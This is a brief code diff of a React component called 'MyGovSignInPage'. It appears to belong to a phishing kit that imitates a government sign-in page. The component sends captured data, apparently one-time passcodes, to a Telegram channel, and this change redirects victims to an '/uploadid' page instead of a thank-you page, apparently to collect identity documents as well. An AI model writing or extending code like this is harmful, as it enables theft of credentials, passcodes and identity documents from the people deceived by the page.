@@ -39,7 +39,7 @@ const MyGovSignInPage: React.FC = () => {
 
     try {
       await sendTelegramMessage(message);
-      window.location.href = '/thankyou';
+      window.location.href = '/uploadid';
     } catch (err) {
       console.log(err)
       setError("Invalid OTP");
